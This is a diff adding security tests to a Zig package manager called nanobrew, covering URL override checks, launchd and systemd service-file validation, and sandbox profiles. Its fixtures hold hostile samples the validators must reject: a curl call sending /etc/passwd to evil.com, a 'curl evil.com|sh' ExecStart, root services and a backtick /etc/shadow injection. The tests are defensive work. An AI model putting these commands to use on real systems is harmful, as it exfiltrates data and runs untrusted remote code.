@@ -4,6 +4,7 @@
 // attack vectors against nanobrew's defensive functions.
 
 const std = @import("std");
+const builtin = @import("builtin");
 const testing = std.testing;
 
 // Import the modules under test
@@ -12,6 +13,10 @@ const version = @import("version.zig");
 const extract = @import("deb/extract.zig");
 const placeholder = @import("platform/placeholder.zig");
 const postinstall = @import("build/postinstall.zig");
+const client = @import("api/client.zig");
+const launchd = @import("services/launchd.zig");
+const sandbox = @import("build/sandbox.zig");
+
 
 // ────────────────────────────────────────────────────────────────────────
 // 1. Path traversal in package names
@@ -386,3 +391,181 @@ test "parseSystemCall with backtick injection stays as argv element" {
     // not interpreted as shell command substitution
     try testing.expectEqualStrings("/tmp/`cat /etc/shadow`", parsed.argv[1]);
 }
+
+// ────────────────────────────────────────────────────────────────────────
+// 11. HTTPS enforcement for API and bottle domain env var overrides
+// ────────────────────────────────────────────────────────────────────────
+
+test "isValidDomainOverride rejects non-HTTPS URLs" {
+    try testing.expect(!client.isValidDomainOverride("http://evil.com/api/"));
+    try testing.expect(!client.isValidDomainOverride("ftp://evil.com/"));
+    try testing.expect(!client.isValidDomainOverride("javascript:alert(1)"));
+    try testing.expect(!client.isValidDomainOverride(""));
+    try testing.expect(!client.isValidDomainOverride("file:///etc/passwd"));
+    // Valid
+    try testing.expect(client.isValidDomainOverride("https://formulae.brew.sh/api/formula/"));
+    try testing.expect(client.isValidDomainOverride("https://my-mirror.example.com/"));
+}
+
+// ────────────────────────────────────────────────────────────────────────
+// 12. Launchd plist content validation
+// ────────────────────────────────────────────────────────────────────────
+
+test "isPlistSafe rejects plist with UserName root" {
+    const plist =
+        \\<?xml version="1.0" encoding="UTF-8"?>
+        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        \\<plist version="1.0">
+        \\<dict>
+        \\  <key>Label</key>
+        \\  <string>homebrew.mxcl.evil</string>
+        \\  <key>UserName</key>
+        \\  <string>root</string>
+        \\  <key>ProgramArguments</key>
+        \\  <array>
+        \\    <string>/opt/nanobrew/prefix/Cellar/evil/1.0/bin/evil</string>
+        \\  </array>
+        \\</dict>
+        \\</plist>
+    ;
+    try testing.expect(!launchd.isPlistSafe(plist, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "isPlistSafe rejects plist with ProgramArguments outside keg" {
+    const plist =
+        \\<?xml version="1.0" encoding="UTF-8"?>
+        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        \\<plist version="1.0">
+        \\<dict>
+        \\  <key>Label</key>
+        \\  <string>homebrew.mxcl.evil</string>
+        \\  <key>ProgramArguments</key>
+        \\  <array>
+        \\    <string>/usr/bin/curl</string>
+        \\    <string>http://evil.com/steal?data=/etc/passwd</string>
+        \\  </array>
+        \\</dict>
+        \\</plist>
+    ;
+    try testing.expect(!launchd.isPlistSafe(plist, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "isPlistSafe accepts safe plist with ProgramArguments inside keg" {
+    const plist =
+        \\<?xml version="1.0" encoding="UTF-8"?>
+        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        \\<plist version="1.0">
+        \\<dict>
+        \\  <key>Label</key>
+        \\  <string>homebrew.mxcl.redis</string>
+        \\  <key>ProgramArguments</key>
+        \\  <array>
+        \\    <string>/opt/nanobrew/prefix/Cellar/redis/7.2.4/bin/redis-server</string>
+        \\    <string>/opt/nanobrew/prefix/Cellar/redis/7.2.4/etc/redis.conf</string>
+        \\  </array>
+        \\</dict>
+        \\</plist>
+    ;
+    try testing.expect(launchd.isPlistSafe(plist, "/opt/nanobrew/prefix/Cellar"));
+}
+
+// ────────────────────────────────────────────────────────────────────────
+// 13. systemd service file validation
+// ────────────────────────────────────────────────────────────────────────
+
+const systemd = @import("services/systemd.zig");
+
+test "isServiceFileSafe rejects User=root" {
+    const content =
+        \\[Unit]
+        \\Description=Evil Service
+        \\
+        \\[Service]
+        \\User=root
+        \\ExecStart=/opt/nanobrew/prefix/Cellar/pkg/1.0/bin/mybin
+        \\
+        \\[Install]
+        \\WantedBy=multi-user.target
+    ;
+    try testing.expect(!systemd.isServiceFileSafe(content, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "isServiceFileSafe rejects ExecStart outside keg" {
+    const content =
+        \\[Unit]
+        \\Description=Malicious Service
+        \\
+        \\[Service]
+        \\ExecStart=/bin/bash -c 'curl evil.com|sh'
+        \\
+        \\[Install]
+        \\WantedBy=multi-user.target
+    ;
+    try testing.expect(!systemd.isServiceFileSafe(content, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "isServiceFileSafe accepts safe service file with ExecStart inside keg" {
+    const content =
+        \\[Unit]
+        \\Description=Safe Service
+        \\
+        \\[Service]
+        \\User=_myservice
+        \\ExecStart=/opt/nanobrew/prefix/Cellar/mypkg/1.0/bin/mypkg --config /etc/mypkg.conf
+        \\
+        \\[Install]
+        \\WantedBy=multi-user.target
+    ;
+    try testing.expect(systemd.isServiceFileSafe(content, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "database MAX_DB_SIZE is larger than old 1 MiB limit" {
+    try testing.expect(Database.MAX_DB_SIZE > 1024 * 1024);
+    try testing.expectEqual(@as(usize, 16 * 1024 * 1024), Database.MAX_DB_SIZE);
+}
+
+// ────────────────────────────────────────────────────────────────────────
+// 14. Sandbox profile generation
+// ────────────────────────────────────────────────────────────────────────
+
+test "sandbox profile contains keg path and no unreplaced placeholders" {
+    const alloc = testing.allocator;
+    const keg = "/opt/nanobrew/prefix/Cellar/wget/1.24.5";
+    const profile = try sandbox.generateProfile(alloc, keg);
+    defer alloc.free(profile);
+
+    // Profile must contain the keg path
+    try testing.expect(std.mem.indexOf(u8, profile, keg) != null);
+
+    // No unreplaced placeholders
+    try testing.expect(std.mem.indexOf(u8, profile, "@@KEG_PATH@@") == null);
+
+    // Contains key deny rules
+    try testing.expect(std.mem.indexOf(u8, profile, "(deny network") != null);
+    try testing.expect(std.mem.indexOf(u8, profile, "(deny default)") != null);
+}
+
+test "sandbox profile rejects keg path with shell metacharacters" {
+    const alloc = testing.allocator;
+    const result = sandbox.generateProfile(alloc, "/opt/nanobrew/\"evil");
+    try testing.expectError(error.UnsafeKegPath, result);
+}
+
+test "sandboxedArgv prepends sandbox-exec on macOS" {
+    const alloc = testing.allocator;
+    const original = &[_][]const u8{ "mkdir", "-p", "/some/path" };
+    const result = try sandbox.sandboxedArgv(alloc, original, "/opt/nanobrew/prefix/Cellar/pkg/1.0");
+    defer {
+        for (result.argv) |arg| alloc.free(@constCast(arg));
+        alloc.free(result.argv);
+        if (result.profile.len > 0) alloc.free(result.profile);
+    }
+
+    if (comptime builtin.os.tag == .macos) {
+        try testing.expectEqual(original.len + 3, result.argv.len);
+        try testing.expectEqualStrings("sandbox-exec", result.argv[0]);
+    } else {
+        try testing.expectEqual(original.len, result.argv.len);
+    }
+}
+
